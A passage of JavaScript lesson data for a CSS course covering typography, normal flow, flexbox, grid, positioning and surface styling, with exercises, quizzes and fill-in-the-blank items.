    ['p', "Typography is most of what makes a page look designed. Four decisions carry nearly all of it: the face, the scale, the line height and the measure."],
    ['h', "Font stacks"],
    ['code', 'css', `body {
  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
}
code, pre {
  font-family: ui-monospace, "Cascadia Mono", Consolas, monospace;
}`],
    ['p', "The browser walks the list until it finds one installed. `system-ui` resolves to the operating system's own face — Segoe UI here, San Francisco on a Mac — so it costs nothing to download and always looks native."],
    ['h', "Loading a webfont"],
    ['code', 'css', `@font-face {
  font-family: "Inter";
  src: url("/static/fonts/inter.woff2") format("woff2");
  font-weight: 100 900;          /* one variable file covers every weight */
  font-display: swap;            /* show fallback text immediately */
}`],
    ['warn', "Without `font-display: swap` the browser hides your text — sometimes for seconds — while the font downloads. Visitors stare at a blank page that is fully rendered underneath."],
    ['h', "A scale, not arbitrary numbers"],
    ['code', 'css', `:root {
  --step--1: 0.833rem;
  --step-0:  1rem;
  --step-1:  1.2rem;
  --step-2:  1.44rem;
  --step-3:  1.728rem;   /* each step ×1.2 */
}
h1 { font-size: var(--step-3); }
h2 { font-size: var(--step-2); }
small { font-size: var(--step--1); }`],
    ['p', "Pick a ratio (1.2 is calm, 1.5 is dramatic) and use only those sizes. Sizes chosen one at a time never quite look related."],
    ['h', "Line height and measure"],
    ['code', 'css', `body {
  line-height: 1.6;        /* unitless — scales with each element's size */
  max-width: 68ch;
}
h1, h2 { line-height: 1.15; }   /* large text needs less */`],
    ['warn', "Always write `line-height` **unitless**. `line-height: 24px` on `body` is inherited as a fixed 24px, so a 32px heading gets 24px lines and overlaps. `1.6` is inherited as a ratio and recalculates per element."],
    ['p', "**Measure** is line length. Below about 45 characters the eye jumps too often; above about 80 it loses the start of the next line. `ch` units make it directly expressible."],
    ['lab', 'css', `.card {
  max-width: 34ch;            /* try 20ch, then 100ch */
  line-height: 1.6;
  font-family: system-ui, sans-serif;
}
h2 {
  font-size: 1.44rem;
  line-height: 1.15;
  text-wrap: balance;         /* evens out the last line */
  margin-top: 0;
}
.note { font-size: 0.833rem; letter-spacing: 0.02em; }`],
    ['h', "Small refinements"],
    ['ul', [
      "`text-wrap: balance` on headings — evens the lines so one word does not dangle.",
      "`text-wrap: pretty` on body copy — avoids single-word last lines.",
      "`letter-spacing: .08em` on uppercase labels; capitals need the air.",
      "`font-variant-numeric: tabular-nums` wherever digits sit in columns."
    ]],
    ['warn', "Never fake bold or italic by transforming text. If a weight is not available the browser synthesises it, and the result is muddy — load the real weight instead."]
  ],
  ex: [
    { q: "Set a system font stack on `body` and a monospace stack on `code`. Why put `system-ui` first?",
      a: "It resolves to the OS's own interface font, so the page feels native, loads instantly and needs no download. The rest of the list is a fallback chain for browsers that do not support it." },
    { q: "Build a 1.2 scale from 1rem and apply it to `h1`, `h2` and `small`.",
      a: "Multiply repeatedly: 1, 1.2, 1.44, 1.728. Related sizes look deliberate in a way hand-picked ones do not.",
      code: ['css', `:root { --step-0: 1rem; --step-1: 1.2rem; --step-2: 1.44rem; --step-3: 1.728rem; }`] },
    { q: "In the lab, change `max-width` to `20ch` then `100ch`. Which is hardest to read and why?",
      a: "Both. At 20ch the eye returns to the left almost every word; at 100ch it struggles to find the start of the next line. Somewhere around 60–75ch is comfortable." },
    { q: "Why is `line-height: 24px` on `body` a bug?",
      a: "It inherits as a fixed 24px, so a 32px heading gets 24px lines and the text overlaps itself. A unitless `1.6` inherits as a ratio and is recalculated against each element's own size." },
    { q: "Add `text-wrap: balance` to a heading and resize the pane. What changes?",
      a: "The browser distributes words evenly across the lines rather than filling each one greedily, so you never get a heading with a single dangling word. It is limited to a few lines by design, which is why `pretty` exists for body copy." }
  ],
  quiz: [
    { q: "Why write line-height unitless?",
      opts: ["Shorter", "It inherits as a ratio and recalculates per element", "px is invalid there", "It is faster"], correct: 1,
      why: "A fixed px line-height inherited by a large heading causes overlapping text." },
    { q: "What does `font-display: swap` do?",
      opts: ["Swaps two fonts", "Shows fallback text immediately instead of hiding it while the font loads", "Preloads the font", "Enables italics"], correct: 1,
      why: "Without it the browser can hide fully-rendered text for seconds." },
    { q: "What is a good measure for body text?",
      opts: ["20–30 characters", "45–75 characters", "100–120 characters", "It does not matter"], correct: 1,
      why: "ch units express it directly: max-width: 68ch." },
    { q: "What does `system-ui` resolve to?",
      opts: ["Arial", "The operating system's own interface font", "The first installed font", "A webfont"], correct: 1,
      why: "Native-looking, instant, no download." }
  ],
  fill: [
    { prompt: "Set a line height that survives inheritance.", lang: 'css',
      code: 'body { line-height: ___; }', opts: ["24px", "1.6", "160%", "1.6em"], correct: 1,
      why: "Unitless inherits as a ratio; px and em inherit a computed length." },
    { prompt: "Cap the line length at a readable measure.", lang: 'css',
      code: 'max-width: 68___;', opts: ["px", "ch", "em", "%"], correct: 1,
      why: "ch is the width of a '0', so it maps directly to characters per line." },
    { prompt: "Show text while the webfont downloads.", lang: 'css',
      code: 'font-display: ___;', opts: ["block", "swap", "auto", "fallback"], correct: 1,
      why: "swap paints with the fallback immediately, then swaps in the real face." }
  ]
};

LESSON_CONTENT_2["css:7"] = {
  blocks: [
    ['p', "Before flexbox and grid there is **normal flow** — the layout you get for free. Most confusing CSS is normal flow behaving exactly as specified while you expected something else."],
    ['h', "Block and inline"],
    ['tbl',
      ["", "Block", "Inline"],
      [
        ["Examples", "`div`, `p`, `h1`, `li`, `section`", "`span`, `a`, `strong`, `em`"],
        ["Width", "fills the parent", "only as wide as its content"],
        ["Stacking", "one per line", "side by side, wrapping"],
        ["`width` / `height`", "apply", "**ignored**"],
        ["Vertical margin", "applies", "**ignored**"],
        ["Horizontal margin", "applies", "applies"]
      ]
    ],
    ['warn', "Setting `width` or `margin-top` on a `<span>` does nothing at all, and nothing warns you. That is the single most common “my CSS is not working” case after a cache problem."],
    ['h', "inline-block"],
    ['code', 'css', `.tag {
  display: inline-block;      /* flows inline, but sizes like a block */
  padding: .25rem .75rem;
  width: 6rem;                /* now respected */
}`],
    ['lab', 'css', `.card span { background: #DCEBE8; }

/* This does nothing — span is inline: */
.card span { width: 200px; margin-top: 40px; }

/* Uncomment to fix it: */
/* .card span { display: inline-block; } */`],
    ['h', "The mysterious gap"],
    ['p', "Inline-block elements are separated by a space, because the whitespace between the tags in your HTML is real content. `flex` or `grid` removes it — which is one reason both are preferred now."],
    ['h', "display: none versus visibility: hidden"],
    ['tbl',
      ["", "`display: none`", "`visibility: hidden`", "`opacity: 0`"],
      [
        ["Takes up space", "no", "yes", "yes"],
        ["Clickable", "no", "no", "**yes**"],
        ["Read by screen readers", "no", "no", "yes"],
        ["Can transition", "no", "no", "yes"]
      ]
    ],
    ['note', "`opacity: 0` is invisible but still there — it catches clicks and is announced by screen readers. Use `display: none` to remove, and the HTML `hidden` attribute when the reason is semantic rather than stylistic."],
    ['h', "Replaced elements"],
    ['p', "`<img>`, `<video>`, `<iframe>` are **replaced** — their content comes from outside CSS. They are inline by default yet do respect width and height, which is why images sit on a text baseline with a few pixels beneath:"],
    ['code', 'css', `img { display: block; max-width: 100%; height: auto; }`],
    ['p', "That three-property rule removes the baseline gap and stops images overflowing their container. Worth having in every stylesheet."]
  ],
  ex: [
    { q: "Give a `<span>` a width and a top margin. What happens, and what is the minimal fix?",
      a: "Nothing happens — inline elements ignore both. `display: inline-block` makes them apply while keeping it in the text flow." },
    { q: "Name three properties that behave differently on inline versus block elements.",
      a: "`width` and `height` are ignored on inline; vertical margins and vertical padding do not push surrounding lines apart (padding paints but does not affect layout); and block elements each start a new line." },
    { q: "Compare `display: none`, `visibility: hidden` and `opacity: 0` for hiding a modal.",
      a: "`display: none` removes it entirely — right for a closed modal. `visibility: hidden` keeps its space, which would leave a hole. `opacity: 0` is the dangerous one: invisible but still clickable and still read aloud, so an invisible dialog can swallow clicks." },
    { q: "Why is there a small gap under an `<img>`, and what removes it?",
      a: "It is inline, so it sits on the text baseline and the descender space appears beneath. `display: block` removes it; so does `vertical-align: middle`." },
    { q: "Write the three-line image rule every stylesheet should have.",
      a: "`display: block` kills the baseline gap, `max-width: 100%` stops overflow, and `height: auto` preserves the aspect ratio while it scales.",
      code: ['css', `img { display: block; max-width: 100%; height: auto; }`] }
  ],
  quiz: [
    { q: "What does `width: 200px` do to a `<span>`?",
      opts: ["Sets its width", "Nothing — inline elements ignore it", "Makes it block", "Throws"], correct: 1,
      why: "Use display: inline-block if you need it to size." },
    { q: "Which hides an element but keeps its space?",
      opts: ["display: none", "visibility: hidden", "hidden attribute", "position: absolute"], correct: 1,
      why: "display: none removes it from layout entirely." },
    { q: "Why is `opacity: 0` risky for hiding things?",
      opts: ["It is slow", "It stays clickable and is read by screen readers", "It breaks layout", "It is deprecated"], correct: 1,
      why: "An invisible element can still intercept clicks." },
    { q: "Why is there a gap beneath an image?",
      opts: ["Default margin", "It is inline and sits on the text baseline", "A border", "A bug"], correct: 1,
      why: "display: block or vertical-align: middle removes it." }
  ],
  fill: [
    { prompt: "Let an inline element take a width.", lang: 'css',
      code: '.tag { display: ___; }', opts: ["block", "inline-block", "flex", "inline"], correct: 1,
      why: "It flows inline but sizes like a block." },
    { prompt: "Remove an element from layout completely.", lang: 'css',
      code: '.modal { display: ___; }', opts: ["hidden", "none", "invisible", "collapse"], correct: 1,
      why: "visibility: hidden would leave its space behind." },
    { prompt: "Stop an image overflowing its container.", lang: 'css',
      code: 'img { max-width: ___; height: auto; }', opts: ["auto", "100%", "none", "inherit"], correct: 1,
      why: "With height: auto the aspect ratio is preserved as it scales." }
  ]
};

LESSON_CONTENT_2["css:8"] = {
  blocks: [
    ['p', "Flexbox lays things out along **one axis** — a row or a column. It is the right tool for navigation bars, toolbars, card rows and centring."],
    ['code', 'css', `.bar {
  display: flex;              /* children become flex items */
  gap: 1rem;
  align-items: center;
  justify-content: space-between;
}`],
    ['h', "Two axes"],
    ['p', "Everything depends on knowing which is which:"],
    ['tbl',
      ["", "`flex-direction: row` (default)", "`flex-direction: column`"],
      [
        ["Main axis", "horizontal →", "vertical ↓"],
        ["`justify-content`", "controls horizontal", "controls **vertical**"],
        ["`align-items`", "controls vertical", "controls **horizontal**"]
      ]
    ],
    ['warn', "`justify-content` works along the **main** axis and `align-items` across it — so switching to `column` swaps what they do. Almost every flexbox mistake is these two applied to the wrong axis."],
    ['lab', 'css', `.card {
  display: flex;
  flex-direction: row;        /* change to column and watch the two below swap */
  justify-content: space-between;
  align-items: center;
  gap: 1rem;
  min-height: 8rem;
  border: 2px dashed #0E7C70;
  padding: 1rem;
}
h2 { margin: 0; font-size: 1.1rem; }
.cta { padding: .4rem 1rem; }`],
    ['h', "The values"],
    ['code', 'css', `justify-content: flex-start | center | flex-end |
                 space-between | space-around | space-evenly;

align-items: stretch | flex-start | center | flex-end | baseline;`],
    ['note', "`align-items: stretch` is the default, which is why flex children often end up the same height without you asking. `baseline` aligns text baselines — the right choice when items have different font sizes."],
    ['h', "How items grow and shrink"],
    ['code', 'css', `.item {
  flex-grow: 1;      /* share of leftover space      (default 0) */
  flex-shrink: 1;    /* willingness to shrink        (default 1) */
  flex-basis: auto;  /* starting size before the above runs      */

  flex: 1;           /* shorthand: grow 1, shrink 1, basis 0     */
  flex: none;        /* 0 0 auto — never grow or shrink          */
}`],
    ['p', "`flex: 1` on every item makes them equal width regardless of content, because `basis: 0` discards their natural sizes. `flex: auto` keeps content influence."],
    ['h', "Wrapping"],
    ['code', 'css', `.row {
  display: flex;
  flex-wrap: wrap;
  gap: 1rem;
}
.row > * { flex: 1 1 14rem; }     /* at least 14rem, then wrap */`],
    ['h', "Patterns worth memorising"],
    ['code', 'css', `/* perfect centring */
.center { display: flex; align-items: center; justify-content: center; }

/* nav: logo left, links right */
.nav { display: flex; justify-content: space-between; align-items: center; }

/* push one item away from the rest */
.nav .login { margin-left: auto; }

/* sidebar + fluid main */
.layout { display: flex; gap: 2rem; }
.sidebar { flex: 0 0 16rem; }
.main    { flex: 1; min-width: 0; }`],
    ['warn', "`min-width: 0` on a flex child is the fix for “my long text refuses to shrink”. Flex items default to `min-width: auto`, which stops them going below their content's intrinsic width."]
  ],
  ex: [
    { q: "Centre a box both ways with three declarations.",
      a: "The old vertical-centring hacks are gone — this is the whole solution.",
      code: ['css', `.center { display: flex; align-items: center; justify-content: center; }`] },
    { q: "In the lab, switch to `flex-direction: column`. What do `justify-content` and `align-items` now control?",
      a: "They swap: `justify-content` becomes vertical and `align-items` horizontal, because they are defined against the main and cross axes rather than the screen." },
    { q: "Build a nav with the logo left and links right, using no floats or absolute positioning.",
      hint: "Two ways: space-between, or auto margin.",
      a: "`space-between` on the container, or `margin-left: auto` on the item you want pushed over — the latter is better when there are three items and only one should move.",
      code: ['css', `.nav { display: flex; align-items: center; justify-content: space-between; }`] },
    { q: "What is the difference between `flex: 1` and `flex: auto`?",
      a: "`flex: 1` is `1 1 0` — the basis is zero, so content size is ignored and items end up equal. `flex: auto` is `1 1 auto` — items start at their natural size and share only the leftover space, so longer content stays wider." },
    { q: "A long unbroken string stops a flex item shrinking. Why, and what fixes it?",
      a: "Flex items default to `min-width: auto`, which is the content's intrinsic minimum. Set `min-width: 0` on the item — the single most useful flexbox debugging trick there is." }
  ],
  quiz: [
    { q: "In `flex-direction: column`, what does `justify-content` control?",
      opts: ["Horizontal", "Vertical", "Both", "Nothing"], correct: 1,
      why: "It follows the main axis, which the direction defines. align-items takes the cross axis." },
    { q: "What is `flex: 1` shorthand for?",
      opts: ["1 1 auto", "1 1 0", "0 1 auto", "1 0 auto"], correct: 1,
      why: "The zero basis is why items become equal width regardless of content." },
    { q: "Which centres a child both ways?",
      opts: ["text-align: center", "align-items + justify-content on a flex parent", "margin: auto only", "vertical-align: middle"], correct: 1,
      why: "Three declarations replace every old centring hack." },
    { q: "A flex item will not shrink below its text. Fix?",
      opts: ["overflow: hidden", "min-width: 0", "flex-shrink: 0", "width: 100%"], correct: 1,
      why: "Flex items default to min-width: auto, their intrinsic content width." }
  ],
  fill: [
    { prompt: "Space children evenly along the row.", lang: 'css',
      code: 'display: flex;\n___: space-between;', opts: ["align-items", "justify-content", "align-content", "place-items"], correct: 1,
      why: "justify-content works along the main axis." },
    { prompt: "Centre children across the cross axis.", lang: 'css',
      code: '___: center;', opts: ["justify-content", "align-items", "text-align", "vertical-align"], correct: 1,
      why: "align-items is the cross axis; justify-content is the main one." },
    { prompt: "Let an item take the leftover space.", lang: 'css',
      code: '.main { ___: 1; }', opts: ["grow", "flex", "size", "width"], correct: 1,
      why: "flex: 1 means grow 1, shrink 1, basis 0." }
  ]
};

LESSON_CONTENT_2["css:9"] = {
  blocks: [
    ['p', "Grid lays out **two axes at once**. Where flexbox arranges a line of things, grid arranges a page."],
    ['code', 'css', `.grid {
  display: grid;
  grid-template-columns: 1fr 1fr 1fr;
  gap: 1rem;
}`],
    ['h', "The fr unit"],
    ['p', "`fr` is a share of the **leftover** space, after gaps and fixed tracks are subtracted:"],
    ['code', 'css', `grid-template-columns: 1fr 1fr;        /* two equal columns */
grid-template-columns: 2fr 1fr;        /* first twice as wide */
grid-template-columns: 200px 1fr;      /* fixed sidebar, fluid main */
grid-template-columns: repeat(3, 1fr); /* the same as the first line */`],
    ['note', "`1fr` is not `33.3%`. A percentage ignores the gaps and overflows; `fr` accounts for them, which is why three `1fr` columns with a gap always fit exactly."],
    ['h', "A responsive grid with no media queries"],
    ['code', 'css', `.cards {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(14rem, 1fr));
  gap: 1rem;
}`],
    ['p', "Read it as: as many columns as fit, each at least 14rem, sharing the leftover space. The number of columns changes with the container — no breakpoints involved. This is probably the single most useful line of modern CSS."],
    ['tbl',
      ["", "`auto-fit`", "`auto-fill`"],
      [
        ["With few items", "they stretch to fill the row", "empty tracks are kept, items stay narrow"],
        ["Usually want", "**auto-fit**", "when a stable column count matters"]
      ]
    ],
    ['lab', 'css', `.card {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(8rem, 1fr));
  gap: .75rem;
  border: 2px dashed #2F4E93;
  padding: 1rem;
}
h2 { grid-column: 1 / -1; margin: 0; }   /* span every column */
.note { background: #DFE5F3; padding: .5rem; }
.cta { padding: .5rem; }`],
    ['h', "Placing items"],
    ['code', 'css', `.hero {
  grid-column: 1 / 3;        /* from line 1 to line 3 = two columns */
  grid-column: span 2;       /* the same, relatively */
  grid-column: 1 / -1;       /* first line to last = full width */
  grid-row: 2 / 4;
}`],
    ['p', "Numbers count **lines**, not columns — three columns have four lines. `-1` is the last, which is why `1 / -1` means full width whatever the column count."],
    ['h', "Named areas"],
    ['code', 'css', `.page {
  display: grid;
  grid-template-columns: 16rem 1fr;
  grid-template-areas:
    "sidebar header"
    "sidebar main"
    "sidebar footer";
  gap: 1rem;
}
.sidebar { grid-area: sidebar; }
.header  { grid-area: header; }
.main    { grid-area: main; }
.footer  { grid-area: footer; }`],
    ['p', "The layout is legible in the CSS itself — you can see the page shape in the quotes. Rearranging is editing the diagram."],
    ['h', "Grid or flexbox?"],
    ['tbl',
      ["Use", "When"],
      [
        ["**Flexbox**", "one direction; sizes come from the content — navs, toolbars, button rows"],
        ["**Grid**", "two directions, or alignment across rows matters — page layouts, card grids, forms"]
      ]
    ],
    ['p', "They nest happily: a grid page whose header is a flex row is the normal arrangement."]
  ],
  ex: [
    { q: "Make a three-column grid with a 1rem gap. Why not `width: 33.3%`?",
      a: "Percentages ignore the gap, so three 33.3% columns plus two gaps overflow the container. `1fr` divides what is left after gaps, so it always fits.",
      code: ['css', `display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem;`] },
    { q: "Write a card grid that reflows with no media queries, minimum 14rem per card.",
      a: "The column count follows the container width, so it works in a sidebar as well as full width — something media queries cannot do.",
      code: ['css', `grid-template-columns: repeat(auto-fit, minmax(14rem, 1fr));`] },
    { q: "What is the difference between `auto-fit` and `auto-fill` with two items in a wide container?",
      a: "`auto-fit` collapses the empty tracks so the two cards stretch across. `auto-fill` keeps the empty tracks, leaving the two cards narrow with space to their right." },
    { q: "Make a heading span every column, whatever the count.",
      hint: "Line numbers, and what -1 means.",
      a: "`1 / -1` is first line to last, so it stays full width even as the column count changes.",
      code: ['css', `h2 { grid-column: 1 / -1; }`] },
    { q: "Sketch a sidebar/header/main/footer layout with named areas, then say when you would use flexbox instead.",
      a: "Grid for the page shell, because alignment matters in both directions. Flexbox inside the header, where a row of items sized by their content is exactly the one-dimensional case." }
  ],
  quiz: [
    { q: "What does `1fr` mean?",
      opts: ["One pixel", "A share of the leftover space after gaps and fixed tracks", "33%", "One row"], correct: 1,
      why: "Unlike a percentage, it accounts for gaps — so the columns always fit." },
    { q: "What does `repeat(auto-fit, minmax(14rem, 1fr))` do?",
      opts: ["Fixed 14rem columns", "As many columns as fit, at least 14rem each, sharing the rest", "One column", "14 columns"], correct: 1,
      why: "A responsive grid with no media queries, driven by the container." },
    { q: "`grid-column: 1 / -1` means…",
      opts: ["Column 1 only", "First line to last — full width", "Minus one column", "Invalid"], correct: 1,
      why: "Numbers count lines. -1 is the last, so this survives a changing column count." },
    { q: "Which suits a navigation bar?",
      opts: ["Grid", "Flexbox", "Float", "Table"], correct: 1,
      why: "One direction, sizes from the content. Grid is for two-dimensional layout." }
  ],
  fill: [
    { prompt: "Three equal columns.", lang: 'css',
      code: 'grid-template-columns: ___(3, 1fr);', opts: ["span", "repeat", "times", "cols"], correct: 1,
      why: "repeat(count, track) expands to the tracks." },
    { prompt: "Reflow without media queries.", lang: 'css',
      code: 'repeat(auto-fit, ___(14rem, 1fr))', opts: ["clamp", "minmax", "range", "between"], correct: 1,
      why: "minmax sets a floor and lets the track share leftover space." },
    { prompt: "Span the full width whatever the column count.", lang: 'css',
      code: 'grid-column: 1 / ___;', opts: ["100%", "-1", "all", "end"], correct: 1,
      why: "-1 is the last grid line." }
  ]
};

LESSON_CONTENT_2["css:10"] = {
  blocks: [
    ['p', "Positioning takes an element out of the ordinary flow. It is how dropdowns, tooltips, sticky headers and overlays are built — and where the word “relative to what?” has to be answered precisely."],
    ['tbl',
      ["Value", "Positioned against", "Keeps its space"],
      [
        ["`static`", "nothing — normal flow (default)", "yes"],
        ["`relative`", "where it would have been", "**yes** — the gap remains"],
        ["`absolute`", "nearest positioned ancestor", "no"],
        ["`fixed`", "the viewport", "no"],
        ["`sticky`", "flow, until it hits a threshold", "yes"]
      ]
    ],
    ['h', "The pairing that matters"],
    ['code', 'css', `.card   { position: relative; }        /* the anchor */
.badge  { position: absolute; top: -.5rem; right: -.5rem; }`],
    ['p', "`absolute` searches **upward** for the nearest ancestor whose `position` is not `static`. If there is none it falls back to the page itself — which is why a badge sometimes flies to the top-left corner of the document. Adding `position: relative` to the intended parent is the fix, and it is almost always the answer."],
    ['lab', 'css', `.card {
  position: relative;         /* remove this line and watch the badge escape */
  border: 2px solid #0E7C70;
  padding: 2rem 1rem 1rem;
  min-height: 7rem;
}
.card::before {
  content: "NEW";
  position: absolute;
  top: -.6rem; left: -.6rem;
  background: #A96A22; color: white;
  font: 600 .7rem system-ui; padding: .2rem .5rem;
}`],
    ['h', "Sticky"],
    ['code', 'css', `.toolbar {
  position: sticky;
  top: 0;              /* required — sticky with no offset never sticks */
  z-index: 10;
}`],
    ['warn', "Two things silently break sticky: no offset (`top`, `bottom`…), and an ancestor with `overflow: hidden` or `overflow: auto`. Sticky is confined to its scrolling container, so an overflow anywhere above it clips the behaviour."],
    ['h', "Stacking contexts"],
    ['p', "`z-index` only compares elements **within the same stacking context**. A new context is created by `position` with a `z-index`, and also by `opacity` below 1, `transform`, `filter`, `will-change` and `isolation: isolate`."],
    ['code', 'css', `.parent  { position: relative; z-index: 1; }
.child   { position: absolute; z-index: 9999; }   /* still under .sibling */
.sibling { position: relative; z-index: 2; }`],
    ['p', "The child's 9999 is compared only against its siblings inside `.parent`. Against `.sibling` what counts is the parent's `1` versus `2`. This is why “I set z-index to 9999 and it still does not show” happens — raise the **ancestor**, not the element."],
    ['h', "Centring an overlay"],
    ['code', 'css', `.overlay {
  position: fixed;
  inset: 0;                          /* top/right/bottom/left: 0 */
  background: #0009;
  display: grid;
  place-items: center;               /* centres the dialog inside */
}`]
  ],
  ex: [
    { q: "Put a badge in a card's top-right corner. Which property makes the card the reference point?",
      a: "`position: relative` on the card. Without it, `absolute` keeps searching upward and usually lands on the page, sending the badge to the document corner." },
    { q: "In the lab, remove `position: relative` from `.card`. Where does the badge go and why?",
      a: "To the top-left of the whole page. `absolute` positions against the nearest *positioned* ancestor, and with none it falls back to the initial containing block." },
    { q: "Your sticky header does not stick. Name the two usual causes.",
      a: "No offset — `position: sticky` without `top` has no threshold to stick at. Or an ancestor with `overflow: hidden`/`auto`, which confines sticky to that container and effectively disables it." },
    { q: "An element with `z-index: 9999` still sits behind another. Explain.",
      a: "It is inside a stacking context whose own z-index is lower than the other element's. Within its context 9999 wins; against the outside world only the ancestor's value counts. Raise the ancestor." },
    { q: "Write a full-screen overlay with a centred dialog, in five declarations.",
      a: "`inset: 0` is shorthand for all four offsets, and `place-items: center` centres on both axes at once.",
      code: ['css', `.overlay {
  position: fixed;
  inset: 0;
  background: #0009;
  display: grid;
  place-items: center;
}`] }
  ],
  quiz: [
    { q: "`position: absolute` is placed relative to…",
      opts: ["The viewport", "Its parent, always", "The nearest ancestor that is not position: static", "The document"], correct: 2,
      why: "With no positioned ancestor it falls back to the page — the classic escaped-badge bug." },
    { q: "Does `position: relative` leave a gap where the element was?",
      opts: ["No", "Yes — its original space is preserved", "Only in flex", "Only with offsets"], correct: 1,
      why: "It shifts visually but still occupies its original box, unlike absolute." },
    { q: "Sticky is not sticking. Most likely?",
      opts: ["Wrong z-index", "No offset, or an ancestor with overflow set", "It needs fixed", "Missing width"], correct: 1,
      why: "Sticky needs a threshold and an unclipped scrolling ancestor." },
    { q: "Why can z-index: 9999 still lose?",
      opts: ["The maximum is 100", "It only competes inside its own stacking context", "It needs position: fixed", "Another rule overrode it"], correct: 1,
      why: "opacity, transform and filter also create stacking contexts — raise the ancestor instead." }
  ],
  fill: [
    { prompt: "Make a card the anchor for an absolute badge.", lang: 'css',
      code: '.card { position: ___; }', opts: ["static", "relative", "absolute", "sticky"], correct: 1,
      why: "Any non-static position makes it the containing block." },
    { prompt: "Cover the whole viewport in one declaration.", lang: 'css',
      code: '.overlay { position: fixed; ___: 0; }', opts: ["margin", "inset", "padding", "offset"], correct: 1,
      why: "inset sets top, right, bottom and left together." },
    { prompt: "Give a sticky header its threshold.", lang: 'css',
      code: 'position: sticky;\n___: 0;', opts: ["margin", "top", "float", "anchor"], correct: 1,
      why: "Without an offset there is nothing to stick at." }
  ]
};

LESSON_CONTENT_2["css:11"] = {
  blocks: [
    ['p', "Surface detail: gradients, shadows and radii. All of it is easy to overdo, so the restraint at the end of this lesson matters more than the syntax."],
    ['h', "Backgrounds layer"],
    ['code', 'css', `.hero {
  background:
    linear-gradient(#0009, #0009),          /* topmost layer */
    url("/static/img/photo.jpg") center / cover no-repeat;
  background-color: #14201E;                /* underneath everything */
}`],
    ['p', "Comma-separated layers paint **first-listed on top**. The `center / cover` is `position / size` in the shorthand."],
    ['h', "Gradients"],
    ['code', 'css', `linear-gradient(to right, #0E7C70, #45C4B2);
linear-gradient(135deg, #0E7C70 0%, #2F4E93 100%);
radial-gradient(circle at 30% 20%, #45C4B2, transparent 70%);

/* a hairline, drawn as a gradient */
linear-gradient(#D2D9D6, #D2D9D6) 0 100% / 100% 1px no-repeat;`],
    ['warn', "Fading to `transparent` passes through transparent **black** in some browsers, producing a grey haze. Fade to the same colour at zero alpha instead: `rgb(14 124 112 / 0)`."],
    ['h', "border-radius"],
    ['code', 'css', `border-radius: 8px;                  /* all corners */
border-radius: 8px 8px 0 0;          /* TL TR BR BL */
border-radius: 50%;                  /* a circle, if square */
border-radius: 999px;                /* a pill */
border-radius: 20px / 10px;          /* horizontal / vertical radii */`],
    ['h', "Shadows"],
    ['code', 'css', `box-shadow: 0 1px 2px #14201E14;      /* x y blur colour */
box-shadow: inset 0 2px 4px #0002;    /* inside */

/* layered, which is what makes it look real */
box-shadow:
  0 1px 2px  #14201E0d,
  0 4px 12px #14201E14;`],
    ['p', "One large soft shadow reads as fog. Two or three — a tight one for the contact edge and a wider one for the ambient — is how physical light behaves, and it is the difference between a card that floats and one that looks smudged."],
    ['lab', 'css', `.card {
  background: linear-gradient(160deg, #FBFCFB, #EDF0EE);
  border: 1px solid #D2D9D6;
  border-radius: 10px;
  padding: 1.25rem;
  box-shadow: 0 1px 2px #14201E0d, 0 6px 16px #14201E14;
}
.cta {
  border: 0; border-radius: 999px;
  background: #0E7C70; color: white;
  padding: .5rem 1.25rem;
  box-shadow: 0 1px 2px #14201E33;
}`],
    ['h', "outline is not border"],
    ['tbl',
      ["", "`border`", "`outline`"],
      [
        ["Takes up space", "yes — changes layout", "no"],
        ["Follows border-radius", "yes", "yes, in modern browsers"],
        ["Can be offset", "no", "yes, `outline-offset`"],
        ["Used for", "the design", "**focus rings**"]
      ]
    ],
    ['note', "Because `outline` costs no layout space, a focus ring never shifts the page — which is exactly why it is the right tool and why replacing it with a border makes things jump."],
    ['h', "Knowing when to stop"],
    ['ul', [
      "A shadow with nothing to separate is decoration, not information.",
      "If every element is elevated, nothing is.",
      "A 1px border often communicates more clearly than a shadow, and always renders faster.",
      "Match the light: shadows should fall the same direction everywhere on the page."
    ]]
  ],
  ex: [
    { q: "Layer a dark gradient over a photograph so white text stays readable.",
      a: "The gradient is listed first, so it paints on top. A flat `#0009` over the whole image is often enough; a gradient lets the darkening concentrate where the text sits.",
      code: ['css', `background: linear-gradient(#0009, #0009), url("photo.jpg") center / cover;`] },
    { q: "Why can `linear-gradient(#0E7C70, transparent)` look dirty?",
      a: "`transparent` is transparent *black*, so the midpoint interpolates toward grey. Fade to the same hue at zero alpha instead: `rgb(14 124 112 / 0)`." },
    { q: "Make a pill button and a circular avatar with `border-radius`.",
      a: "A radius larger than half the height clamps to a pill; `50%` on a square gives a circle.",
      code: ['css', `.pill { border-radius: 999px; }
.avatar { width: 3rem; height: 3rem; border-radius: 50%; }`] },
    { q: "Replace one large shadow with a layered pair. Why does it look better?",
      a: "Real objects cast a tight dark shadow where they meet the surface and a wide faint one further out. A single large blur has neither, so it reads as fog rather than elevation.",
      code: ['css', `box-shadow: 0 1px 2px #14201E0d, 0 6px 16px #14201E14;`] },
    { q: "Why is `outline` the right property for a focus ring rather than `border`?",
      a: "`outline` occupies no layout space, so adding it on focus does not resize the element or shift everything after it. A border would, making the page jump every time you Tab." }
  ],
  quiz: [
    { q: "In a comma-separated background list, which layer is on top?",
      opts: ["The last", "The first", "The largest", "Undefined"], correct: 1,
      why: "First listed paints topmost; background-color is always underneath." },
    { q: "Why can fading to `transparent` look grey?",
      opts: ["A browser bug", "transparent is transparent black, so it interpolates toward grey", "Wrong colour space", "It does not"], correct: 1,
      why: "Fade to the same colour at zero alpha instead." },
    { q: "Why layer two shadows instead of one big one?",
      opts: ["Faster", "It mimics real light — a tight contact shadow plus a wide ambient one", "Required for radius", "For dark mode"], correct: 1,
      why: "One large blur reads as fog rather than elevation." },
    { q: "Which does not affect layout?",
      opts: ["border", "padding", "outline", "margin"], correct: 2,
      why: "Which is why a focus ring uses outline — the page never shifts." }
  ],
  fill: [
    { prompt: "Make a pill-shaped button.", lang: 'css',
      code: 'border-radius: ___;', opts: ["50%", "999px", "1rem", "100"], correct: 1,
      why: "A radius past half the height clamps to a pill; 50% on a non-square gives an ellipse." },
    { prompt: "Draw the shadow inside the element.", lang: 'css',
      code: 'box-shadow: ___ 0 2px 4px #0002;', opts: ["inner", "inset", "inside", "in"], correct: 1,
      why: "Without it the shadow is cast outward." },
    { prompt: "Push the focus ring away from the edge.", lang: 'css',
